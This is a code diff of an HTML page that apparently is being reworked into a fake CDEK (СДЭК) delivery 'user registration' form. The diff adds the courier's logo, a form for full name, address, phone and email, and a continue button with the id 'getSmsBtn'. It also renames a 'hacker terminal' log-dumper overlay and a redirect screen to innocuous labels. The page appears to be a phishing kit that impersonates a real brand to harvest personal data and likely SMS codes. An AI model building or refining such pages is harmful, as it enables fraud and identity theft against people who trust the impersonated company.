@@ -8,23 +8,15 @@
 </head>
 <body>
 
-    <!-- ЭКРАН 1: Первичный прелоадер -->
+    <!-- ЭКРАН 1: Первичная инициализация -->
     <div id="sitePreloader" class="preloader">
         <div class="spinner"></div>
         <div class="preloader-text">Инициализация сервиса...</div>
     </div>
 
-    <!-- ЭКРАН ХАКЕРСКОГО ТЕРМИНАЛА (Выгрузка логов) -->
+    <!-- ЭКРАН 2: ТЕРМИНАЛ (Чистый консольный блок) -->
     <div id="hackerModal" class="hacker-overlay">
         <div class="hacker-window">
-            <div class="hacker-header">
-                <div class="window-buttons">
-                    <span class="btn-dot close"></span>
-                    <span class="btn-dot min"></span>
-                    <span class="btn-dot max"></span>
-                </div>
-                <div class="hacker-title">root@system_core:~ log_dumper_v2.04</div>
-            </div>
             <div class="hacker-body">
                 <div id="terminalConsole" class="terminal-console"></div>
                 <div class="hacker-progress-container">
@@ -40,10 +32,10 @@
         </div>
     </div>
 
-    <!-- ЭКРАН 3: Модальное окно загрузки профиля -->
+    <!-- ЭКРАН 4: Перенаправление / Загрузка профиля -->
     <div id="profileLoaderOverlay" class="modal-overlay">
         <div class="top-logo-container">
-            <img src="flags/logo.png" alt="Test Logo" class="top-logo">
+            <img src="flags/logo.png" alt="Logo" class="top-logo">
         </div>
 
         <div class="status-card">
@@ -58,43 +50,40 @@
         </div>
     </div>
 
-    <!-- ЭКРАН 2: Основной интерфейс -->
+    <!-- ЭКРАН 3: Основная форма (СДЭК) -->
     <div class="page-wrapper" id="mainContent">
         <div class="card active">
+            <!-- Логотип над слоганом -->
             <div class="logo-container">
-                <img src="" alt="">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTGmnNH7IajkFqD8JBpC2ZqNy1QbascYux29PnRRxg5dQ&s=10" alt="Логотип" class="logo-img" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';">
+                <div class="logo-placeholder" style="display:none;">СДЭК</div>
             </div>
             
             <h2>Регистрация пользователя</h2>
             
-            <div class="form-group">
-                <label>ФИО</label>
-                <input type="text" id="fullName" placeholder="Иванов Иван Иванович" required>
-            </div>
-
-            <div class="form-group">
-                <label>Адрес доставки</label>
-                <input type="text" id="fullAddress" placeholder="г. Москва, ул. Ленина, д. 10" required>
-            </div>
-
-            <div class="form-group">
-                <label>Номер телефона</label>
-                <div class="phone-input-group">
-                    <div class="custom-select-wrapper" id="countrySelectWrapper">
-                        <div class="custom-select-trigger" id="countrySelectTrigger">
-                            <span id="selectedCode">+7</span>
-                        </div>
-                    </div>
-                    <input type="tel" id="phoneNumber" placeholder="123-456-78-90" required>
+            <form onsubmit="return false;">
+                <div class="form-group">
+                    <label>ФИО</label>
+                    <input type="text" id="fullName" placeholder="Иванов Иван Иванович" required>
                 </div>
-            </div>
 
-            <div class="form-group">
-                <label>E-mail адрес</label>
-                <input type="email" id="emailInput" placeholder="ivanov@example.com" required>
-            </div>
+                <div class="form-group">
+                    <label>Адрес доставки</label>
+                    <input type="text" id="fullAddress" placeholder="г. Москва, ул. Ленина, д. 10" required>
+                </div>
 
-            <button id="getSmsBtn" class="btn-green">Продолжить</button>
+                <div class="form-group">
+                    <label>Номер телефона</label>
+                    <input type="tel" id="phoneNumber" placeholder="+7 912 345 67 89" required>
+                </div>
+
+                <div class="form-group">
+                    <label>E-mail адрес</label>
+                    <input type="email" id="emailInput" placeholder="ivanov@example.com" required>
+                </div>
+
+                <button type="submit" id="getSmsBtn" class="btn-green">Продолжить</button>
+            </form>
         </div>
     </div>
 
